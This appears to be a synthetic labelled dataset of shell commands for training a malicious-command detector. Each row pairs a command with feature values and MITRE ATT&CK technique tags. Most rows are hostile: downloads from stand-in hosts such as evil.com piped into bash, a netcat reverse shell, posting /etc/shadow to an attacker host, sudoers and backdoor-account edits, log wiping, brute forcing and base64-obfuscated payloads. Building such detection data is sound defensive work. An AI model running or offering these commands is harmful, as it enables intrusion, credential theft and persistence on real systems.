"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())"" && > /dev/null 2>&1","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -r 'password' /var/www/html --include='*.php' && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
useradd -m -s /bin/bash -G sudo newadmin ; > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1112_Modify_Registry'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo uname -a,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
pip  install  requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""hostnamectl""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
groups,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
unshadow /etc/passwd /etc/shadow > crackme,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'd2hvIDsgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1112_Modify_Registry'],synthetic
nohup echo 'Y2F0IC9ldGMvcmVzb2x2LmNvbmY=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time ./pwnkit ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
echo 'cGFzc3dkIC1kIHJvb3QgfCA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
sudo getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup traceroute google.com &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdA==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo  'compromised  ALL=(ALL)  NOPASSWD:ALL'  >>  /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
wmic useraccount list | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3  -c  ""import  urllib.request;  urllib.request.urlretrieve('http://evil.com/payload',  '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time arp-scan --localnet,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZSA7IGhpc3RvcnkgLWM=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""./pwnkit && > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""net user /add attacker P@ssw0rd | echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 0, 0]",['T1136_Create_Account'],synthetic
cp /etc/hosts /tmp/hosts.bak,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
wget --post-file=/etc/passwd http://attacker.com/receive && history -c,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
unshadow /etc/passwd /etc/shadow > crackme | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29yICYmIGVjaG8gZG9uZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dGZ0cCAtaSAxMC4wLjAuOTkgR0VUIHBheWxvYWQuZXhlIEM6XFdpbmRvd3NcVGVtcFxwYXlsb2FkLmV4ZSB8IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo history -c && history -w,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""./CVE-2021-4034""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
sudo echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykp' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup net localgroup administrators | > /dev/null 2>&1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo history -c && history -w,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""curl -X POST http://evil.com/collect -d @/etc/shadow""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
rm -rf /tmp/* /var/tmp/* && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykp' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
smbclient //10.0.0.5/C$ -U Administrator | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nohup nmap -sV -p 22,80,443 10.0.0.0/24 &","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
time ip link show && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.44, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
time nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & | sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg  delete  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  /v  Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
useradd -m -s /bin/bash hacker | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'bGFzdCAtbiAxMCB8IGhpc3RvcnkgLWM=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo perl -e 'use Socket; ...',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbiB8IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/network/interfaces | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo hello world,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'c21iY2xpZW50IC8vMTAuMC4wLjUvQyQgLVUgQWRtaW5pc3RyYXRvciB8ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Li9wd25raXQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
ssh admin@localhost ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'bmNyYWNrIC1wIDIyIC0tdXNlciByb290IC1QIHBhc3MubHN0IDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
time crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""ln -s /tmp/backdoor.sh /etc/cron.d/system-update""","[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1053_Scheduled_Task'],synthetic
unzip archive.zip -d /opt/,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
nohup psexec.py Administrator:password@10.0.0.5 cmd.exe &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ | history -c,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cGVybCAtZSAnZXZhbCBwYWNrIHEvSCovLCBxLzczNjM3MjY5NzA3NDJlNjU3MDczMmY1MjY1NmQ2Zjc0NjUyZTcwNmU2Ny8n' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time find / -perm -4000 -type f 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5 | echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
